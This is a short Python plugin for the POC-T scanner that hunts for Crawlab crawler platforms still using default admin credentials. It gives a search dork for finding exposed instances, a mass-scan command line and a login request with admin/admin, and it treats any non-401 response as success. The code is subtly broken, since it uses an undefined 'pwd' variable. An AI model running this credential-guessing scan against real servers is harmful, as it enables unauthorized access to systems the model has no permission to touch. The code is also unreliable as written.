#!/usr/bin/env python
# -*- encoding: utf-8 -*-
'''
@File    :   __init__.py.py    
@DateTime :  2023/9/12 23:19 


@Dork
    title=="Crawlab | Distributed Web Crawler Platform"

@Cmdline
    python POC-T.py -s Crawlab_weak_pass.py -aF title=="Crawlab | Distributed Web Crawler Platform"


@Request
```
POST /api/login

{"username":"admin","password":"admin"}
```

@Expected Response
    not 401
'''

from lib.utils.http import request_ex, get_http_url, urljoin_ex
from lib.utils.dic import Wordlist
from lib.core.data import logger as log


def poc(url):
    url = urljoin_ex(url, "/api/login")
    resp = request_ex("post", url, json={"username": "admin", "password": pwd})
    if resp and resp.status_code != 401:
        return True
    else:
        return False
